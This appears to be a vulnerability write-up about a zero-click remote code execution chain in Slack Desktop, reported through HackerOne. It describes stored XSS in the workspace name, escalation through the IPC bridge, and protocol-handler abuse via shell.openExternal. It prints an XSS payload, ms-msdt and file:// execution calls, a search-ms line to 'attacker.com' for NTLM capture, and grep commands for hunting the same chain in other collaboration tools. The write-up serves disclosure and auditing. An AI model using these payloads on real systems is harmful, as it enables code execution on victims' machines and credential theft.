---
title: Slack HN-783877 — Zero-Click RCE
description: Slack zero-click remote code execution via workspace name XSS — discovered by Oskars Vegeris
---

# Slack HN-783877 — Zero-Click RCE

<div class="es-flow">
  <div class="es-flow-box es-flow-source">Workspace name<br>Stored XSS</div>
  <div class="es-flow-arrow">→</div>
  <div class="es-flow-box es-flow-taint">IPC escalation<br>via preload bridge</div>
  <div class="es-flow-arrow">→</div>
  <div class="es-flow-box es-flow-sink">shell.openExternal<br>→ protocol RCE</div>
</div>

$30,000. That was Slack's payout for this finding. And for that price, Slack got a complete, weaponized, zero-click remote code execution chain — one that required no action from the victim beyond having Slack open.

Zero-click is worth understanding as a concept before diving into the technical chain. It means the attacker doesn't need the victim to click a link, open a file, or do anything. The payload executes automatically when the vulnerable content renders. In a messaging app, that's whenever the user's client loads the workspace or the attacker's message comes into view. The victim's only "interaction" is using the software they've already installed.

---

## Summary

| Field | Value |
|-------|-------|
| **ID** | HN-783877 (HackerOne) |
| **Researcher** | Oskars Vegeris |
| **Application** | Slack Desktop (legacy Electron) |
| **Vulnerability Class** | Zero-click XSS → IPC injection → protocol handler RCE |
| **CVSS Score** | ~9.0 (Critical) |
| **Bug Bounty** | $30,000 (HackerOne) |
| **Year** | 2021 |
| **Interaction** | Zero-click — victim only needs Slack open |

---

## The Key Insight: Metadata is as Untrusted as Messages

This is the insight that made this finding work, and it's portable to every other collaboration tool.

Developers who think about XSS in messaging apps tend to sanitize message content carefully. They know that `message.body` is untrusted user input. But workspace names, channel descriptions, user display names, team metadata — these go through different code paths. They're set by admins, or synced from the backend, or used only in specific UI contexts. They feel more "internal" than message content.

They're not. They're still user-controlled strings that get rendered in the client. Oskars Vegeris treated workspace metadata as equally untrusted as message content and found that it wasn't sanitized with the same rigor.

An attacker with workspace admin access (or access to a compromised admin account) could set the workspace name to:

```
<img src=x onerror="slackExploit()">
```

When any member's Slack client loaded the workspace, this executed in the renderer.

---

## Technical Chain

### Step 1: Stored XSS via Workspace Name

```
Attacker (workspace admin) sets workspace name to:
<img src=x onerror="slackExploit()">

When any member opens Slack → workspace renders → XSS fires
No clicks required. Just opening the app.
```

### Step 2: Accessing the IPC Bridge

Slack's preload script exposed Slack's internal event system to the renderer. The specific mechanism was Slack's link-opening handler — when users clicked links in messages, Slack dispatched an internal action that the main process handled via `shell.openExternal`.

```javascript
// Slack's internal dispatch (simplified):
SLACK_REDUX_STORE.dispatch({
  type: 'OPEN_URL',
  url: attackerURL  // Attacker-controlled URL from XSS payload
});
```

### Step 3: Protocol Handler Exploitation

The main process handler called `shell.openExternal(url)` without sufficient URL scheme validation. With an attacker-controlled URL:

```javascript
// On Windows — ms-msdt (Follina, on unpatched systems):
shell.openExternal('ms-msdt:/id PCWDiagnostic /skip force /param "..."');

// Cross-platform — file:// execution:
shell.openExternal('file:///C:/Windows/System32/cmd.exe');

// NTLM capture via search-ms:
shell.openExternal('search-ms:query=test&crumb=location:file://attacker.com/share');
```

---

## Oskars Vegeris's Methodology

Vegeris is a Latvian security researcher who demonstrated the same chain across multiple collaboration tools — Slack ($30k), Microsoft Teams (similar finding via MSRC), Element/Matrix. The methodology is consistent:

1. **Identify all server-controlled content that renders in the UI** — not just message bodies, but workspace names, channel descriptions, user display names, notification content, link previews, bot names. Any string that comes from the API and renders in Electron is a candidate.

2. **Test metadata separately from messages** — different code paths, often different sanitization. A team that carefully sanitizes `message.body` via their XSS-prevention library may pass `workspace.name` directly to innerHTML because it's "admin-set content."

3. **Enumerate the preload bridge for link-opening functions** — every collaboration tool has one. It's how they open hyperlinks in the user's browser. That function is also how an attacker escalates from XSS to `shell.openExternal`.

4. **Find the `shell.openExternal` call and check URL validation** — if any protocol other than `https://` and `mailto:` is permitted, test the known dangerous protocol handlers for the target platform.

The chain is: XSS in metadata → link-opening IPC bridge → `shell.openExternal` with arbitrary URL → OS protocol handler → RCE.

---

## Why the Payout Was $30,000

At the time, Slack's HackerOne program paid based on severity and impact. $30k reflected:
- **Zero-click** — no victim interaction required at all
- **Scope** — every Slack Desktop user on Windows
- **Chain completeness** — working PoC demonstrating Calculator execution
- **Impact** — RCE without any authentication breach

For comparison, Discord's similar (but click-required) finding (CVE-2020-15174) paid $10k. The zero-click property was worth 3x the payout.

---

## Fix

Slack's remediation:
1. **Input sanitization** — workspace names and other API-sourced content HTML-escaped before rendering
2. **URL validation in link handler** — `shell.openExternal` calls validated against allowed schemes (`https://`, `slack://`, `mailto:`)
3. **Electron upgrade** — moved to newer Electron with better default security config

---

## Pattern for Finding This Elsewhere

When auditing a collaboration tool (Slack, Teams, Discord, Mattermost, Notion, Figma, etc.):

```bash
# Find all places where API-provided metadata is rendered:
grep -r "workspace\|channel.*name\|display.*name\|team.*name\|org.*name" \
  --include="*.js" . | grep -v node_modules | \
  grep -E "innerHTML\|dangerouslySetInnerHTML\|document\.write"

# Find the link-opening handler — every collab tool has one:
grep -r "openExternal\|open-url\|OPEN_URL\|openLink\|handleLink" \
  --include="*.js" . | grep -v node_modules

# Check URL validation in the link opener:
grep -r "openExternal" --include="*.js" . -B 10 | grep -v node_modules | \
  grep -E "protocol\|scheme\|https?\|allowedUrl"
# If protocol validation is missing: any scheme is accepted
```

The chain-building approach: find the XSS in metadata first, then trace forward to find how the preload bridges link clicks to the main process, then verify whether the URL passed to `shell.openExternal` is validated. If you can't immediately connect XSS to `openExternal`, enumerate the preload more carefully — the link-opening function is almost certainly there.
